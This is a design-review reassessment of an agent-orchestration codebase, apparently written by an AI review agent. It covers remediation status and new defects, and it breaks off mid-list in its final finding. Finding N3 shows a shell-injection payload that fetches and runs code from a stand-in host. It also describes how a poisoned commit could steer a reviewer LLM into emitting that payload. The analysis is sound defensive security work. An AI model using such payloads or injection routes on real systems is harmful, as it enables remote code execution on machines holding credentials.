# Design Review Reassessment: apra-fleet-workflow + apra-fleet-se/auto-sprint

**Date:** 2026-07-11 (follow-up to the 14:21 UTC review in `docs/feedback.md`)
**Reviewer:** Fable (background deep-review agent), high reasoning effort
**Scope:** Read-only. Independent re-examination of every original finding (F1-F11,
A0-A7, testing gaps 1-4) against the CURRENT code on `feat/fleet-reorg`, plus a hunt for
NEW issues introduced or exposed by the remediation waves. The vendored apra-pm state was
read from its real, reviewed location (`C:\akhil\git\wt-unw13\vendor\apra-pm`, local
branch `tmp/unw13-vendor-agent-defs`, unpushed), not from the outer repo's stale
submodule pointer.

Paths: `WF` = `packages/apra-fleet-workflow`, `SE` = `packages/apra-fleet-se`,
`CL` = `packages/apra-fleet-client`, `VP` = `wt-unw13/packages/apra-fleet-se/apra-pm`.

Verification note: both test suites were executed during this review and passed
(`WF`: 86/86; `SE`: 95/95 plus the standalone mock-runner script, exit 0). Every
finding in Part 2 is a defect the green suites do not detect.

---

## Part 1 -- Reassessment of the original findings

### F1. Sandbox/vetting theater, loader breaks own examples -- **FULLY FIXED**
`WF/src/workflow/engine.mjs:21-100`: scripts are loaded as real ES modules via
`import(pathToFileURL(...))`; the `AsyncFunction` path and export-stripping regex are
gone (`executeSource()` now throws with an explanatory message, engine.mjs:192-199).
The trust model is stated honestly in code comments and in
`docs/apra-fleet-workflow-architecture.md` section 3; vetting is explicitly advisory
with an opt-in `strictVetting` gate. `examples/03-transform-sequential.js` and the edge
fixtures now use the `main(context)` entry-point contract and run.
Minor residue (not re-flagged as a finding): `import()` caches modules by URL, so two
`executeFile()` calls on the same path share module-level state and a script edited
mid-process is not re-read. Harmless for the current stateless scripts; worth a doc note.

### F2. Fabricated usage/cost -- **FIXED (honest), but see N10**
`WF/src/workflow/index.mjs:653-661`: no more `Math.random()`; missing usage becomes
`usage: null`, `cost: null`. The viewer renders "n/a" and tallies an `unknownCostCount`
(`WF/src/viewer/index.mjs:437-446`) instead of fabricating totals.
`pricing.mjs` no longer has a `default` fallback and returns `null` for unknown models.
The honesty goal is met. However, the practical consequence is that the whole cost
pipeline is now inert for real runs -- see N10.

### F3. Budget dead stub -- **PARTIALLY FIXED / FIXED-BUT-INERT**
`budget._spent += cost` is debited on every attempt (index.mjs:659-661), and `agent()`
checks `budget.remaining() <= 0` pre-dispatch and throws a typed `BudgetExceededError`
(index.mjs:595-600). Mechanism: correct, tested. In practice: runner.js never passes
`opts.model`, so `calculateCost('default', ...)` -> no pricing match -> `cost === null`
-> `_spent` never increments -> `BudgetExceededError` is unreachable for an auto-sprint
run. The plan's definition-of-done item 4 ("honest cost accounting with an enforced
budget") is met in letter, not in force. See N10.

### F4. Inconsistent error contract -- **FIXED, one new wart**
`WF/src/workflow/errors.mjs` implements the full typed hierarchy (WorkflowError +
MemberNotFound/AgentOutput/Command/FleetTransport/BudgetExceeded/Cancelled), with
proposal-Option-2-compatible `.code` values. `agent()`/`command()` never return `null`;
member-not-found is surfaced as a typed throw (index.mjs:677-681, 900-904), and the
string-sniff is clearly labeled as a server-side-stopgap. runner.js's old
`.includes()`-on-null TypeError class of bug is structurally gone (all verdicts are
schema objects now). One regression introduced by the fix: `command()` double-emits
`activity:end` for typed errors -- see N7.

### F5. Prompt-and-scrape, single-shot structured output -- **FULLY FIXED**
index.mjs:58-248: fenced-block extraction + real bracket/string-state matching
(`findBalancedEnd`), schema-directed candidate selection, and a bounded repair loop
(`schemaRetries`, default 2) whose re-ask prompt is self-contained (does not rely on
`resume: true`). Exhaustion produces a typed `AgentOutputError` preserving `.cause`.
Well tested (`apra-fleet-workflow-schema-repair.test.mjs`). One narrow edge remains --
the either/or preference for fenced blocks (see N17).

### F6. No timeout/retry/idempotency/resume -- **LARGELY FIXED, resume has a structural blind spot**
- Timeout: `CL/src/client/client.mjs` -- every request gets a client-side timeout,
  defaulting to a derived hint + 30s grace or a hard 15-minute ceiling, never infinite.
  Typed `TimeoutError`/`AbortError`. Tested (`fleet-client-timeout.test.mjs`).
- Cancellation: AbortSignal threaded end-to-end; `requestStop()` + per-run
  AbortController; `CancelledError`.
- Journal: `WF/src/workflow/journal.mjs` + engine wiring -- append-only JSONL of the
  existing event stream, off by default, partial replay with divergence detection,
  started-but-unfinished activities surfaced as `journal:ambiguous` (never
  auto-resolved). Idempotency keys honestly descoped to the server.
This is a faithful implementation of the plan. But two real defects hide in the replay
path: replay of `failSoft` commands returns the wrong shape (N5), and the replay-key
sequence counter is shared across `parallel()` branches, so any run with a multi-streak
develop phase diverges at the barrier and re-executes live from there -- which means
resume provides almost no protection for exactly the runs (long multi-doer sprints)
that need it most (N6).

### F7. sequential() divergence -- **FULLY FIXED**
index.mjs:944-1031: `sequential(items, processor, opts)` validates arity (extra
positional args throw TypeError), `pipeline(items, ...stages, [opts])` implements the
multi-stage form, both attach `err.partialResults` on fail-fast. Docs
(architecture.md), examples (02-sprint-runner.js uses `pipeline`), and tests
(test-edge-sequential.js fixed) were updated together, as the original review asked.

### F8. Doc-vs-code contradictions -- **FIXED**
architecture.md section 2 now states "fail-fast by default, opt-in resilience" and
documents `continueOnError` and `partialResults` accurately; workflow-guide.md:101
correctly says transform errors "DO propagate". Verified against the code paths.

### F9. Viewer lifecycle / stop / XSS -- **FIXED, minor cosmetic residue**
- `end` is emitted from `WorkflowEngine.executeFile()`'s `finally` on success, failure,
  and cancellation (engine.mjs:168-176); the viewer transitions to DONE/FAILED/CANCELLED
  and auto-closes after 5s.
- `/stop` is cooperative (`workflow.requestStop()`, viewer/index.mjs:477-505); no
  `process.exit`.
- XSS: `escapeHtml` is a single shared implementation (html-utils.mjs) embedded via
  `.toString()`; the beads extension escapes id/title/description/status
  (SE/auto-sprint/viewer-extensions.mjs:59-76) and is unit-tested without a DOM.
Residue: the browser poll error path treats only `success`/`failed` as terminal
(viewer/index.mjs:359), so a CANCELLED run shows OFFLINE after the server closes
(cosmetic); the viewer's group/phase tracking is still single-run despite the engine now
supporting concurrent runs (accepted single-tenant usage, but undocumented).

### F10. Hidden resume state -- **FIXED at the layer boundary; one dispatch still leans on it in spirit**
`AgentOptions.resume` is documented; `agent()` explicitly sends `resume: false` unless
overridden (index.mjs:635), and the client layer documents its own `true` default as
overridden by the workflow layer (CL/api.mjs:10-15). Almost every runner.js prompt is
now genuinely self-contained (planner, doer, reviewer, final review, harvester). The one
exception is the plan-reviewer dispatch: `'Review the plan per your agent contract.'`
(runner.js:739) carries no sprint scope at all -- with `resume: false` the reviewer has
no session state to fall back on, and the vendored contract explicitly requires the
scope in the prompt. This is no longer an F10 "hidden state" bug (there is no hidden
state); it is now an explicit missing-input bug -- folded into N1.

### F11. Single-tenant engine -- **FIXED**
AsyncLocalStorage per-run store (index.mjs:13-56, 1197-1240); `parallel()` forks a
shallow store copy per branch so `phase()` cannot leak across branches; args/budget
shared by reference within a run; activity ids are `randomUUID()`; concurrency test
exists (`apra-fleet-workflow-concurrency.test.mjs`). Legacy direct-call usage preserved.
Clean implementation.

### A0. Product doesn't exist end-to-end -- **FIXED, with CLI-robustness residue**
`SE/bin/cli.mjs` is fully wired: real transport/initialize handshake, real `bd show`
issue precondition, real `list_members` validation, engine + viewer + runner execution,
exit code from the run. runner.js consumes every declared arg via a strict
`validateArgs()` (unknown keys rejected, all values validated, runner.js:167-246), and
git semantics exist (branch-ensure at start, push + `gh pr create` -- never merge -- at
finalization). Residue collected in N14 (silently-ignored unknown CLI flags via
`strict: false`, warn-and-continue on missing members, `requirementsFile`/`roleMap`
advertised by the skill but not exposed as flags, `bd show` precondition runs on the
local machine while the sprint's bd runs on the member, hardcoded port 8080) and N4
(branch only ensured on ONE member).

### A1. Unapproved plan executed; substring approval -- **FIXED as specified; contract re-divergence supersedes it (N1)**
runner.js:718-782: approval is `verdict.verdict === 'APPROVED'` on a schema-validated
object; repair-loop exhaustion counts as CHANGES_NEEDED, never approval; 3 rejected
rounds throw a typed `SprintPlanRejectedError` before any doer dispatch; cycle > 1
produces an explicit delta re-plan prompt; feedback is fenced via `wrapUntrustedBlock`.
The regression test drives the exact original failure mode ("This can NOT be APPROVED"
free text) and asserts zero doer dispatches. Within its own frame this is a complete
fix. However, the planner prompt's model-tier instruction and the plan-reviewer
dispatch's missing scope now contradict the vendored role contracts -- once those
contracts are live on members, every plan phase fails. That is the single most serious
finding of this reassessment (N1).

### A2/A3. Develop/review loop -- **FIXED, thorough; one injected-shell hole and lifecycle nits**
- Casing bug root-caused: `roleConst()` validates against `contracts.ROLES` at module
  load (runner.js:24-31); multi-member pool regression-tested with 2 members.
- Streak assignment consumed for real, schema-validated, with a provably-safe
  `selectStreaks()` fallback (pure function, exact-cover check).
- Doer barrier: `parallel(..., { continueOnError: true })`, one retry, outcomes recorded
  via closure before rethrow so no information is lost.
- Lying-doer detection: post-dispatch `bd show` verification, streak treated FAILED if
  any assigned bead is not closed, regardless of the doer's report. Tested.
- Reviewer: self-contained prompt with bead ids + full `bd show --json` + diff range,
  explicit prohibition on bd mutation, orchestrator applies `reopenIds`/`newTasks`
  (V1 resolution). Per-bead feedback routing replaces the old broadcast.
This is the strongest part of the remediation. Remaining problems: the `newTasks`
`bd create` interpolation escapes only double quotes -- a live shell-injection channel
from LLM output (N3); the doer prompt omits the branch the vendored doer contract
requires (folded into N1); `reviewerPool` is computed but only `reviewerPool[0]` is ever
used (dead generality); the retry is a blind double-dispatch (acknowledged idempotency
descope, but note it re-runs even after an `AgentOutputError`, i.e. up to 6 LLM calls
per streak per round); `bd show` JSON (planner-authored titles/descriptions) is embedded
in the reviewer prompt unfenced, unlike other inter-agent text (minor A7 inconsistency).

### A4. Deploy/integ fragile probes -- **FIXED; replay-path defect (N5) and a contract seam**
`probeFileExists()` uses one flat, nesting-free `node -e` probe via
`command(..., { failSoft: true })` (runner.js:636-646); `command()`'s failSoft contract
is implemented and CancelledError is correctly exempted (index.mjs:776-798). Deployer
and integ runner are schema-validated; `passed`/`deployed` are consumed honestly;
failures accumulate into `deployFailures`/`integFailures` and flow into the final
verdict evidence. Probe-failure-skips-phase is regression-tested with deterministic
command-failure injection. Residue: journal replay returns the wrong shape to failSoft
callers (N5); the integ runner still mutates beads directly ("Add bug beads if needed")
while the reviewer is forbidden to -- consistent with the vendored role split, but worth
stating in one place as a deliberate asymmetry rather than leaving it implicit.

### A5. Exit logic -- **LARGELY FIXED; verdict-lifecycle and stall edge cases remain (N8, N9)**
The completion check is now `bd list --status=open,in_progress,blocked
--priority-max=<goalMax>` empty AND last reviewer verdict APPROVED (runner.js:1145-1181)
-- verified that the local `bd` supports comma-separated `--status` and `--priority-max`.
Stall-abort after 2 zero-progress cycles throws a typed `StalledSprintError` with the
closed-count history attached. `parseBdJson()` names the offending command and includes
an output snippet. Cycle-label off-by-one fixed (`finalCycleLabel`). The orphaned-
in_progress-bead and goal-priority-exit scenarios are both regression-tested. Remaining
gaps: `lastReviewVerdict` is never reset per cycle and has an unsatisfiable-exit corner
(N8); the closed-count stall metric can be defeated by close/reopen oscillation (N9);
`deferred` is not in `NOT_DONE_STATUSES`, so a goal-priority bead deferred mid-sprint
counts as done (minor, listed under N18).

### A6. Final verdict theater -- **FIXED; publish-phase residue (N11)**
`buildFinalVerdictPrompt()` embeds real orchestrator-gathered evidence (closed count,
open-at-goal count, deploy/integ failure lists, diff range); the verdict is
schema-validated (`finalVerdict`), repair-exhaustion maps to FAIL, and the workflow's
return value is derived from it (`status: verdict === 'PASS' ? 'success' : 'failed'`,
runner.js:1291-1299). The mock final reviewer is itself evidence-based (parses the
prompt's evidence rather than rubber-stamping), which is a genuinely good test-design
choice. The source-level greps in the test (no unconditional `{status:'success'}`)
guard against regression. Residue: the branch push + PR creation run unconditionally
BEFORE the verdict-driven return and are not idempotent (N11); the harvester dispatch
contradicts the vendored harvester contract (N12).

### A7. Injection surfaces -- **LARGELY FIXED; one new hole in the fix itself (N3)**
- Issue ids and branch names validated against safe patterns at BOTH the CLI and the
  runner (single shared validators, imported from runner.js into cli.mjs).
- Inter-agent feedback fenced via `wrapUntrustedBlock` with collision-resistant fence
  sizing (longest-backtick-run + 1) -- a nice touch that closes the
  fence-escape loophole.
- Viewer XSS fixed (F9 above).
But the reviewer's `newTasks` path -- added BY the A3 fix -- interpolates LLM-authored
title/description/priority into a shell command with only `"` escaped (N3). The original
A7 finding's exact recommendation (validate/delimit everything that flows from agent
output into `command()`) was applied to ids and feedback but not to this new surface.

### Testing gaps 1-4 -- **1, 2, 3 fixed; 4 fixed with a coverage hole (N16)**
1. Both suites run and pass (WF: 86/86 at review time; SE suite executed during this
   review -- see the note at the end). Dead imports/paths are gone; `test-runner.test.mjs`
   and the edge fixtures are live tests.
2. The SE mock is deterministic (no Math.random), matches the exact lowercase agentTypes,
   fails loudly on any unhandled agentType (advanced-mock-runner-test.mjs:424-428 --
   exactly the silent-fallthrough bug the original mock had), runs real `bd` against a
   scratch dir, and covers every phase including deploy/integ/final/harvest.
3. Failure-path regression tests exist for the load-bearing modes: unapproved-plan
   fallthrough, blocked/orphaned-bead false completion, doer throw inside parallel,
   lying doer, stall-abort, probe failure, bd JSON noise, schema repair, MCP timeout,
   budget, member-not-found. Genuinely exercised (mock handlers reproduce the real
   failure inputs), not just named after the findings.
4. Golden-transcript test exists with normalization (bead ids -> title-slugs, ISO
   timestamps, tmpdir), first-divergence field-level diffing, and an explicit
   UPDATE_GOLDEN gate plus a two-run determinism proof. Two caveats: the golden scenario
   is deliberately single-bead, so the two unw.19 ordering fixes it motivated are NOT
   regression-protected by it (N16); and the git/gh interception means no git failure
   mode is ever exercised (N11's failure would not be caught by any current test).

---

## Part 2 -- New findings (N-series)

### N1. The runner and the vendored role contracts have re-diverged in three load-bearing places -- every sprint fails once the vendored defs are live
**Severity: CRITICAL (highest of this review)**

The unw.13/unw.21/unw.24 vendor work and the unw.15/unw.16/unw.17 runner work were
reviewed in isolation and moved in opposite directions. Reading
`VP/agents/*.md` (branch `tmp/unw13-vendor-agent-defs`) against runner.js:

1. **Model-tier convention.** runner.js's planner prompt instructs
   `bd update <task-id> --notes="model: <tier>"` (runner.js:302-306), and its own long
   comment (runner.js:259-273) says "no separate --metadata convention was found
   anywhere in the vendored skills/agents docs... If a later issue introduces a real
   --metadata convention, this prompt should be updated to match." That later issue
   happened: `VP` commit ac04688/8cb90a4 (apra-fleet-unw.24) standardized on
   `--metadata '{"model": "..."}'` everywhere. `VP/agents/planner.md` Step 3 now says
   "not in `--notes`... the ONLY location"; `VP/agents/plan-reviewer.md` criterion 10
   hard-fails any task without the `model` METADATA key and explicitly says "not
   `--notes`"; `VP/skills/pm/SKILL.md:166-167` says the tier "is never written to
   `--notes`". A planner that follows the runner's prompt plus a plan-reviewer that
   follows its own contract = criterion-10 CHANGES_NEEDED on every round = guaranteed
   `SprintPlanRejectedError` for every sprint. This is the original V2 bug reintroduced
   at the seam between two independently-approved fixes.
2. **Plan-reviewer scope.** The dispatch is the context-free string `'Review the plan
   per your agent contract.'` (runner.js:739). `VP/agents/plan-reviewer.md` Inputs:
   "Your dispatch prompt must supply: the sprint root / scope to review (required)",
   missing-input behavior: return CHANGES_NEEDED. `VP/agents/schemas/plan-reviewer-input.json`
   requires `scope`. A contract-obeying plan-reviewer never approves. (Under F10's
   `resume: false` there is also no session state to paper over this.)
3. **Doer branch.** `buildDoerPrompt()` (runner.js:410-426) supplies bead ids and
   feedback but no branch. `VP/agents/doer.md` Inputs: "`branch` (required)...
   Missing-input behavior: ... Return `status: "BLOCKED"`". A contract-obeying doer
   returns BLOCKED on every dispatch; nothing ever closes; the sprint dies via
   stall-abort.

**Failure scenario:** the moment members run agent personas from the new apra-pm (via
submodule bump + reinstall, or simply because a member's installed apra-pm is newer than
the outer repo's stale pointer -- persona resolution is member-side, so this is NOT
gated on the submodule bump), every auto-sprint run fails in the plan phase, and if it
somehow passed, in the develop phase.

**Why no single reviewer caught it:** each vendor PR was checked against the vendored
prose's internal consistency; each runner PR was checked against "the current submodule
snapshot" (the runner comment says so verbatim). Nobody owned the cross-artifact
contract, and no test loads a vendored agent .md and checks the runner's prompts against
its Inputs section.

**Fix direction:** (a) update `buildPlannerPrompt` to the `--metadata` convention;
(b) build a real plan-reviewer prompt carrying the sprint root ids and goal; (c) add
`branch` to the doer prompt; (d) add a contract test that parses each
`VP/agents/schemas/<role>-input.json` and asserts the corresponding runner prompt
builder supplies every required input (this is precisely what `validateRoleInput` was
built for -- see N13); (e) make the vendor sign-off checklist include "re-run the runner
contract test against the candidate submodule commit".

### N2. contracts.mjs will silently run on fallback literals forever -- and the rename has already broken the lookup
**Severity: HIGH**

`SE/auto-sprint/contracts.mjs` `loadVendorSchema(role)` looks up
`packages/apra-fleet-se/apra-pm/agents/schemas/<role>.json` (contracts.mjs:221-228, 407-413), but the
vendored files were renamed to `<role>-output.json` (`VP` commits 7d99cdb/352a5c8). The
consumer-side rename is still in adversarial review (unmerged), so on the CURRENT merged
tree, even after a submodule bump the output-schema loader would find nothing and fall
back to the literals -- silently, because "file not found" is by design the graceful-
degradation state. Three compounding structural problems:

1. **Absence is unobservable.** Nothing distinguishes "submodule not bumped yet"
   (expected) from "bumped but renamed/moved/typo'd" (a bug). There is no log line, no
   counter, no test that fails when the fallback engages where a vendored file was
   expected. Fallback-forever is the steady state unless a human notices.
2. **No drift detection.** If a vendored output schema evolves within major version 1
   (new optional field, tightened enum), the fallback literal diverges and nothing
   catches it -- the version-pin check only fires on a MAJOR bump, and only when the
   file is actually found. The fixture snapshot
   (`SE/test/fixtures/apra-pm-schemas/`) still uses the OLD file names
   (`reviewer.json`, not `reviewer-output.json`), i.e. the test net is pinned to the
   pre-rename layout and would keep passing after the bump while production silently
   used fallbacks.
3. **The fixture is a hand-copied snapshot with no consistency check** against the real
   vendored files. It can rot independently of both the fallback literals and the
   vendored truth.

**Fix direction:** after the submodule bump lands, invert the default: a role listed in
ROLES whose expected output-schema file is absent should throw (or at minimum
console.warn + emit an event), with an explicit allowlist for roles that legitimately
have none (planner). Add a test that, when `packages/apra-fleet-se/apra-pm/agents/schemas/` exists,
asserts (a) every resolved SCHEMAS entry came from a vendored file, and (b) each
fallback literal deep-equals its vendored counterpart (fail = update the literal in the
same commit as the bump). Regenerate the fixture from the vendored dir mechanically, not
by hand.

### N3. Shell injection from reviewer output via `newTasks` -> `bd create`
**Severity: HIGH**

runner.js:1039-1047:

```js
const title = String(newTask.title).replace(/"/g, '\\"');
...
await command(`bd create "${title}" -d "${description}" -p "${priority}" ...`);
```

Only double quotes are escaped. `command()` executes through a shell on the member
(the mock uses `child_process.exec`, i.e. a shell; the real fleet member likewise). In
POSIX shells, `` ` `` and `$(...)` are interpreted INSIDE double quotes, and a trailing
`\` can neutralize the escaping. The reviewer is an LLM whose input includes the diff
under review -- a poisoned commit or bead description can steer it into emitting
`newTasks: [{ title: "x$(curl evil|sh)" ... }]`, which becomes remote shell execution on
the orchestrator member. This is the exact A7 class ("agent output interpolated raw into
a shell command") reintroduced by the A3 fix, in the one place the new data flows from a
schema field into `command()`. `priority` is equally unvalidated despite the schema
typing it as a bare string.

**Failure scenario:** adversarial (or merely erratic) reviewer output -> arbitrary
command on the member holding the beads DB and git credentials.

**Fix direction:** validate before interpolation -- `priority` must match
`/^P[0-4]$/`; title/description restricted to a safe character class, or better, write
them to a temp file / pass via stdin, or use an argv-array dispatch path if the fleet
API ever grows one. At minimum escape `\`, `` ` ``, `$` as well -- but allowlisting is
the robust answer given Windows/POSIX shell divergence on the member side.

### N4. The sprint branch is ensured on exactly one member; doers/reviewers on other members never get it
**Severity: HIGH (multi-member deployments); latent because the mock cannot see it**

`git fetch ... && git checkout -B <branch> origin/<base>` is dispatched once, to
`orchestratorMember` only (runner.js:594-603). But doers round-robin across ALL
configured members (`doerPool[index % doerPool.length]`, runner.js:905) and the reviewer
runs on `reviewerPool[0]`. On a real multi-member fleet, members 2..N work on whatever
branch their checkout happens to have. Relatedly, every `bd` command the orchestrator
issues (`bd list`, `bd show` verification, reopen transitions) runs against the
orchestrator member's working copy, while each doer's `bd close` runs against its own
member's copy -- the runner performs no `bd`/git sync between members, so the
whole multi-member design implicitly assumes either a shared working folder or an
out-of-band sync that runner.js neither performs nor documents. The mock masks all of
this: git/gh commands are intercepted and returned as "ok", and every member shares one
tempDir and one beads DB (advanced-mock-runner-test.mjs:223-225), so the multi-doer
regression test passes while the real topology is unspecified.

**Failure scenario:** 2-member sprint on real fleet -- doer on m2 commits to the wrong
branch (or detached/stale HEAD); orchestrator's `bd show` verification never sees m2's
`bd close` (separate DB) -> streak marked FAILED -> retry -> stall-abort; or worse,
work lands on m2's `main`.

**Fix direction:** dispatch the branch-ensure to EVERY member in the union of pools
before the first doer round (and re-ensure after reopen rounds if members can drift), or
explicitly document and validate the shared-workspace assumption at CLI precondition
time (e.g. compare `git rev-parse` / `bd info` identity across members and refuse to
start on mismatch).

### N5. Journal replay breaks the failSoft contract -- resumed runs silently skip Deploy/Integ
**Severity: MEDIUM**

`command()` with `failSoft: true` resolves to `{ ok, output, error }` (index.mjs:913),
but the replay cache path returns the journaled raw string (`return cached.output;`,
index.mjs:859) regardless of failSoft. On a resumed run, `probeFileExists()` gets a
string, reads `res.ok` as `undefined`, logs "Probe ... failed (treating as not-found)",
and skips Deploy and Integ -- a silent behavioral divergence between an original run and
its replay, in exactly the feature (resume) whose selling point is behavioral fidelity.
No test covers replay-through-failSoft.

**Fix direction:** journal the failSoft flag or the shaped result (the activity:end for
a failSoft success currently records only `output`); on replay, reconstruct the shape
the caller asked for. Add a resume test whose journal includes a probe command.

### N6. Replay keys are sequence-numbered through `parallel()`, so resume diverges at the first multi-streak barrier
**Severity: MEDIUM**

`store.activitySeq` is a single shared counter (deliberately, index.mjs:1222-1227), and
each `agent()`/`command()` takes `sequence = activitySeq.value++` at call time. Inside
the doer `parallel()` barrier, branch interleaving (which streak's `agent()` vs
`bd show` verification vs `updateDashboard()` increments next) is scheduler-dependent --
the golden-transcript test itself documents this race as the reason it restricts itself
to one bead. Consequently a resumed multi-streak run computes different sequence numbers
than the journaled run, misses the cache (`replayKey` mismatch), sets
`replay.diverged = true`, and re-executes everything from the develop phase live --
including re-dispatching doers whose work already happened (the double-dispatch hazard
the journal was built to mitigate). The divergence path is safe-by-design, but the
practical result is that resume only helps up to the first parallel fan-out, and neither
journal.mjs's docs nor engine.mjs's `resumeJournal` docs say so.

**Fix direction:** make the replay key independent of global ordering for parallel
branches, e.g. per-branch sub-sequences keyed by branch index (`parallel()` already
forks the store; give each fork `activitySeq = { value: 0, prefix: parentSeq + ':' + i }`),
or fall back to (type, member, textHash, occurrence-count) keys. At minimum, document
the limitation and emit the existing `journal:diverged` warning with a hint when the
divergence happens inside a parallel region.

### N7. `command()` double-emits `activity:end` for typed errors
**Severity: MEDIUM (journal/observability correctness)**

In `command()`, MemberNotFoundError and CommandError each emit `activity:end` at the
throw site (index.mjs:902, 908) and are then caught by the outer catch, which -- unlike
`agent()`, whose catch explicitly skips re-emission for WorkflowError with a comment
saying why (index.mjs:745-749) -- emits `activity:end` AGAIN (index.mjs:917) before
`softFail()`. Every failed command therefore writes two `activity:end` records to the
journal (same id) and fires two viewer updates. `loadJournal()` happens to be resilient
(last-end-wins by id), but any consumer counting failures, and the golden intent of
"journal = verbatim event stream", is wrong. A clear asymmetry between two functions
that were remediated by the same wave and reviewed separately.

**Fix direction:** mirror agent()'s catch: `if (error instanceof WorkflowError) { return
softFail(error); }` without re-emitting. Add a journal test asserting exactly one
activity:end per activity id on the failure path.

### N8. `lastReviewVerdict` lifecycle: stale APPROVED can end a cycle it never reviewed, and a terminal CHANGES_NEEDED makes the exit condition unsatisfiable
**Severity: MEDIUM**

`lastReviewVerdict` is declared once outside the cycle loop (runner.js:688) and never
reset per cycle, despite the comment claiming it is per-cycle ("the last Develop/Review
loop's reviewer verdict for each cycle"). Two consequences:

1. **Stale approval.** Cycle N ends APPROVED but with an out-of-scope blocker; cycle
   N+1 has no ready beads (develop skipped entirely, runner.js:819-821), yet the exit
   check at runner.js:1177 can fire on cycle N's verdict even though no reviewer looked
   at cycle N+1's state (deploy/integ may have failed in between -- those only affect
   the final verdict evidence, not the exit gate).
2. **Unsatisfiable exit.** If the reviewer returns CHANGES_NEEDED with EMPTY `reopenIds`
   (schema-legal; nothing detects the contradiction) after every bead closed, the dev
   loop breaks on empty-ready, `openAtGoal` is 0 but the verdict is not APPROVED, so the
   cycle loop continues; every later cycle skips develop (no ready beads), the verdict
   never changes, the closed count never changes, and after 2 cycles the sprint dies as
   `StalledSprintError` -- a finished sprint misreported as stalled. No test covers
   CHANGES_NEEDED-with-empty-reopenIds.

**Fix direction:** reset `lastReviewVerdict = null` at the top of each cycle; treat
CHANGES_NEEDED with empty `reopenIds` AND empty `newTasks` as a reviewer contract
violation (retry the review or surface it distinctly); consider a dedicated
"re-review before exit" dispatch when the exit check would otherwise rely on a verdict
from an earlier cycle.

### N9. Stall detection is defeated by close/reopen oscillation
**Severity: MEDIUM**

Stall tracking compares the absolute closed count cycle-over-cycle and resets
`staleCycles` on ANY change (runner.js:1160-1167). A develop/review loop that closes a
bead each cycle and reopens it the next produces a count sequence like 5,4,5,4... --
every cycle "changes", `staleCycles` never reaches 2, and the sprint burns all
max_cycles doing net-zero work: precisely the failure the stall-abort was mandated to
stop, reachable by the most common real-world thrash pattern (doer fixes, reviewer
reopens, repeat). The regression test only covers the monotone-flat case.

**Fix direction:** track a high-water mark of the closed count (progress = new
all-time-high), or count per-bead close events net of reopens, or flag any bead reopened
more than K times as thrash and abort/escalate on that signal.

### N10. The cost/budget pipeline is honest but inert: no real dispatch can ever be priced
**Severity: MEDIUM**

Chain of facts: runner.js passes no `model` on any dispatch -> activityMeta.model is
'default' -> `calculateCost('default', usage)` matches nothing in a pricing table whose
newest entry is mid-2024 (pricing.mjs:7-15) -> cost is null even when the fleet DOES
report usage -> `_spent` stays 0 -> `BudgetExceededError` unreachable -> dashboard
permanently shows `$0.000 Spent (+N unknown)`. F2's honesty goal is met; F3's
enforcement goal and plan DoD item 4 ("enforced budget") are met only for hypothetical
callers that pass a 2024-era model id. The budget/usage tests all pass because they
inject those exact ids.

**Fix direction:** price from the model the FLEET reports in the result (ask the server
to echo the resolved model alongside usage -- add to the descoped-server-side list), or
map fleet tier names to current per-tier estimate rows clearly labeled estimates, and
refresh the table. Until then, document that `budget.total` is only enforceable when
callers pass a priced model id.

### N11. Publish phase: not idempotent, unconditional, and untestable under the current mock
**Severity: MEDIUM**

runner.js:1264-1282 always pushes and runs `gh pr create` -- even when the final verdict
was FAIL (arguably intended: a human reviews the PR; but the PR body does not carry the
verdict, so a FAIL sprint's PR looks like any other). Worse: on a re-run of the same
sprint branch (the natural response to a failed run), `gh pr create` exits non-zero
because a PR already exists -> `CommandError` -> the entire second sprint, after
succeeding end-to-end, throws in its final phase. Neither call uses `failSoft` or an
existence check. And because both mocks intercept `/^(git|gh)\s/` and return "ok", no
test can ever observe this class of failure.

**Fix direction:** `gh pr view <branch> || gh pr create ...` (or parse the create
failure for "already exists" and continue); include the verdict in the PR title/body;
decide explicitly whether a FAIL verdict should still publish (and say so in the body);
extend the mock with an injectable git/gh failure mode.

### N12. Harvester dispatch vs vendored harvester contract: mutually incompatible, and `validateRoleInput` as documented would hard-fail it
**Severity: LOW-MEDIUM**

`VP/agents/harvester.md` requires `analysisArtifactFile`/`analysisText`/`costAnalysis`
and mandates "Stop and return status FAILED" when missing (missing-input behavior);
`VP/agents/schemas/harvester-input.json` marks all five keys required. runner.js
deliberately omits them and instructs the harvester to "treat ... as UNAVAILABLE, and
explicitly mark any harvester step that depends on them as skipped" (runner.js:518-526)
-- a direct instruction to violate its own contract. A contract-obeying harvester
returns FAILED every sprint (logged, non-fatal today). Meanwhile contracts.mjs's own
integration example (contracts.mjs:486-503) shows validateRoleInput('harvester', ...)
failing fast on exactly this context -- so wiring the pre-flight helper as documented
would turn every harvest into a hard dispatch failure. Two halves of the same wave
pointing in opposite directions.

**Fix direction:** the orchestrator has (or can trivially compute) the required data --
the journal and budget objects exist; unw.11's event stream is 90% of `analysisText`.
Either wire real values into the harvester dispatch, or change the vendored contract to
make those inputs optional-with-degraded-output. Do not wire validateRoleInput for the
harvester until one of those happens.

### N13. `validateRoleInput` unwired: mostly fine to defer, EXCEPT that it would have caught N1
**Severity: assessment item (asked for explicitly)**

The helper itself is sound (cached compilation, version-pinned, no-op when a role has no
input schema). Deferral is genuinely fine for the reviewer (the prompt already carries
base-branch/branch). It is NOT fine as a pure deferral for plan-reviewer, doer, and
harvester: their input schemas encode exactly the required inputs the current prompts
omit (N1 items 2-3, N12). Had the wiring existed -- or had even a TEST called
`validateRoleInput` for each role against the context each prompt builder actually
assembles -- the N1 divergences would have failed CI the day the vendored schemas
landed in the fixture snapshot. The gap is load-bearing in its absence-of-signal role,
not in its runtime-enforcement role.

**Fix direction:** before (or instead of) wiring it into the hot dispatch path, add a
static contract test: for each role runner.js dispatches, build the same context object
the prompt builder consumes and assert `validateRoleInput(role, ctx).valid`. That test,
run against the fixture snapshot, is the cheap tripwire for every future N1.

### N14. CLI robustness gaps contradict the "loud fail" arg contract
**Severity: LOW-MEDIUM**

- `parseArgs({ options, strict: false })` (cli.mjs:60): a typo'd flag
  (`--max-cycle 3`, `--requirements-file x`) is silently ignored and defaults apply --
  the exact silent-no-op drift `validateArgs()` was built to reject one layer down.
- Missing members are warned about and dropped (cli.mjs:175-177); a fleet-wide typo
  silently shrinks the doer pool to 1 -- the A2 symptom via a different door. At least
  an explicit `--allow-missing-members` should be required to proceed.
- The skill contract advertises `requirementsFile`; the CLI has no flag for it (nor
  `roleMap`), so the advertised feature is unreachable from the advertised entry point.
- The `bd show` issue precondition runs on the LOCAL machine (execFile, cli.mjs:123)
